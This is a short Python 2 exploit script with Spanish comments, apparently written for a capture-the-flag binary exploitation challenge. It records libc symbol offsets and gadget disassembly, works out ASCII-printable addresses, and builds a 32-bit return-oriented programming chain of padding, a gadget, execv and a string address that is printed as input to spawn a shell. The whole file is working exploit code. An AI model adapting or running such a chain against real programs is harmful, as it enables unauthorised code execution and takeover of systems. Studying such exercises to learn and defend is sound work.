import struct


# int is_ascii(int c){
#     if(c>=0x20 && c<=0x7f) return 1;
#     return 0;
# }

# 0x0015d7ec -> /bin/sh

# 0003eed0   141 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
# 000b88e0   350 FUNC    GLOBAL DEFAULT   12 execl@@GLIBC_2.0
# 000b8780   341 FUNC    GLOBAL DEFAULT   12 execle@@GLIBC_2.0
# 000b8a80   322 FUNC    GLOBAL DEFAULT   12 execlp@@GLIBC_2.0
# 000b8740    52 FUNC    GLOBAL DEFAULT   12 execv@@GLIBC_2.0
# 000b85e0    83 FUNC    WEAK   DEFAULT   12 execve@@GLIBC_2.0
# 000b8a40    52 FUNC    GLOBAL DEFAULT   12 execvp@@GLIBC_2.0
# 000b8bd0  1108 FUNC    WEAK   DEFAULT   12 execvpe@@GLIBC_2.11

# ascii printable?

# 000b8780   341 FUNC    GLOBAL DEFAULT   12 execle@@GLIBC_2.0
# 000b8a80   322 FUNC    GLOBAL DEFAULT   12 execlp@@GLIBC_2.0
# 000b8740    52 FUNC    GLOBAL DEFAULT   12 execv@@GLIBC_2.0
# 000b8a40    52 FUNC    GLOBAL DEFAULT   12 execvp@@GLIBC_2.0

# b8780 -> 0x55616780
# b8a80 -> 0x55616a80
# b8740 -> 0x55616740 -> printable
# b8a40 -> 0x55616a40

# 000b8740    52 FUNC    GLOBAL DEFAULT   12 execv@@GLIBC_2.0

# 0x55616740 -> execv@@GLIBC_2.0



"""
pop rax
/bin/sh addr
execv addr

"""
"""
	0x55615d44
  0x000b7d44                 58  pop eax
  0x000b7d45         3d01f0ffff  cmp eax, 0xfffff001
  0x000b7d4a               7301  jae 0xb7d4d
  0x000b7d4c                 c3  ret



1695 0x00165a40 0x00165a40   8  36 (.rodata) utf32le November
0x00165a40 -> 0x556c3a40

"""


"""
			Esto solo anda para 64 bits!!
libcBase = struct.pack("I", 0x5555e000)
pad  = 'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD'
rop  = struct.pack("I", 0x55615d44) # pop eax; cmp eax, 0xfffff001; jae 0xb7d4d; ret
rop += struct.pack("I", 0x556c3a40) # str N
rop += struct.pack("I", 0x55616740) # execv

print pad + rop
"""


#       calling convention para 32 bits...
"""

sub esp, 8
push 0
lea eax, str.bin_sh
push eax
call sym.imp.execlp 


stack luego de llamar
<ret addr>
<bin_sh addr>
<null>

"""

# sub esp, 0x18 causara lio?

pad  = 'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD'
rop  = struct.pack("I", 0x555e7c55) # ret gadget -> con esto obtengo el param 0x0
rop += struct.pack("I", 0x55616740) # execv
rop += struct.pack("I", 0x556c3a40) # ret addr
rop += struct.pack("I", 0x556c3a40) # str N

print pad + rop


